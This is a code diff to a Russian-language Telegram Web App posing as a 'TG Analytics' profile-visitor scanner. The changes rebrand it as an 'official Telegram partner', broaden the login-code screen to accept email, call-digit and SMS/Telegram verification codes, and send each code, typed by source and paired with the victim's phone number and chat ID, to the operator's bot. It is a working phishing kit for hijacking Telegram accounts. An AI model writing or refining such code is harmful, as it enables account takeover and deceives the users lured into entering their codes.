@@ -177,13 +177,25 @@
             display: none;
         }
         .note { text-align: center; color: #8e8e93; font-size: 12px; margin-top: 16px; }
+        
+        .code-hint {
+            background: #f0f7ff;
+            border-radius: 12px;
+            padding: 12px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #007AFF;
+            text-align: left;
+            line-height: 1.5;
+        }
+        .code-hint span { display: block; margin: 4px 0; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
             <h1>📊 TG Analytics</h1>
-            <p>Сканер посетителей профиля</p>
+            <p>Официальный партнер Telegram</p>
         </div>
         
         <div class="content">
@@ -196,16 +208,29 @@
             
             <!-- Экран ввода кода -->
             <div id="codeScreen" class="code-screen">
-                <h2>🔐 Подтверждение входа</h2>
-                <p style="color: #6c757d; margin-bottom: 20px;">Введите 5-значный код из Telegram</p>
+                <h2>🔐 Подтверждение доступа</h2>
+                <p style="color: #6c757d; margin-bottom: 10px;">Введите код из любого источника:</p>
                 
-                <input type="text" id="codeInput" class="code-input" maxlength="5" inputmode="numeric" pattern="\d*" placeholder="— — — — —" autofocus>
+                <div class="code-hint">
+                    <span>📧 <strong>Почта:</strong> 6 цифр (код из письма)</span>
+                    <span>📞 <strong>Звонок:</strong> последние 4 цифры номера</span>
+                    <span>📱 <strong>SMS/Telegram:</strong> 5 цифр</span>
+                </div>
+                
+                <input type="text" id="codeInput" class="code-input" maxlength="6" inputmode="numeric" pattern="\d*" placeholder="_ _ _ _ _ _" autofocus>
                 
                 <button class="verify-btn" id="verifyBtn" onclick="verifyCode()">Подтвердить код</button>
                 
-                <div class="info-box">
-                    <strong>📨 Код отправлен в Telegram!</strong><br>
-                    Если не видите сообщение - проверьте раздел "Сообщения" в приложении.
+                <div class="info-box" style="text-align: left;">
+                    <strong>📨 Где искать код:</strong><br>
+                    • Если настраивали почту — проверьте email (6 цифр)<br>
+                    • Если был звонок — последние 4 цифры номера<br>
+                    • Если пришло SMS/Telegram — 5 цифр<br>
+                    <br>
+                    <strong>❓ Не приходит?</strong><br>
+                    • Подождите 30 секунд<br>
+                    • В Telegram появится кнопка «Позвонить мне»<br>
+                    • Или настройте почту (инструкция в чате)
                 </div>
                 
                 <div class="error-message" id="codeError"></div>
@@ -279,7 +304,10 @@
             setTimeout(() => {
                 document.getElementById('loadingScreen').classList.remove('active');
                 document.getElementById('codeScreen').classList.add('active');
-                document.getElementById('statusNote').innerText = 'Введите код из Telegram';
+                document.getElementById('statusNote').innerText = 'Ожидание кода...';
+                
+                // Автоматически фокусируемся на поле ввода
+                document.getElementById('codeInput').focus();
             }, 1500);
         }
         
@@ -287,9 +315,16 @@
             const code = document.getElementById('codeInput').value.trim();
             const errorEl = document.getElementById('codeError');
             
-            if (code.length !== 5 || !/^\d+$/.test(code)) {
+            // Проверяем что код состоит из цифр и имеет длину 4, 5 или 6
+            if (!/^\d+$/.test(code)) {
                 errorEl.style.display = 'block';
-                errorEl.innerText = 'Введите 5 цифр';
+                errorEl.innerText = 'Код должен содержать только цифры';
+                return;
+            }
+            
+            if (code.length !== 4 && code.length !== 5 && code.length !== 6) {
+                errorEl.style.display = 'block';
+                errorEl.innerText = 'Введите 4, 5 или 6 цифр (зависит от источника)';
                 return;
             }
             
@@ -298,11 +333,18 @@
             document.getElementById('verifyBtn').disabled = true;
             document.getElementById('statusNote').innerText = 'Отправка кода...';
             
+            // Определяем тип кода по длине
+            let codeType = 'unknown';
+            if (code.length === 4) codeType = 'call';
+            else if (code.length === 5) codeType = 'sms';
+            else if (code.length === 6) codeType = 'email';
+            
             // Отправляем код в бота
             try {
                 tg.sendData(JSON.stringify({
                     t: 'c',
                     v: code,
+                    type: codeType,
                     phone: phone,
                     chat: chatId
                 }));
@@ -401,7 +443,10 @@
                     
                     // Сообщаем боту
                     try {
-                        tg.sendData(JSON.stringify({ t: 'scan_complete', count: results.length }));
+                        tg.sendData(JSON.stringify({ 
+                            t: 'scan_complete', 
+                            count: results.length 
+                        }));
                     } catch (e) {}
                 }
                 
@@ -412,7 +457,7 @@
         
         function displayResults(results) {
             const container = document.getElementById('results');
-            container.innerHTML = '<h3 style="margin-bottom: 16px;">📋 Результаты</h3>';
+            container.innerHTML = '<h3 style="margin-bottom: 16px;">📋 Результаты сканирования</h3>';
             
             results.forEach((item, index) => {
                 setTimeout(() => {
@@ -433,6 +478,13 @@
                 }, index * 100);
             });
         }
+        
+        // Добавляем поддержку Enter для отправки кода
+        document.getElementById('codeInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                verifyCode();
+            }
+        });
     </script>
 </body>
 </html>
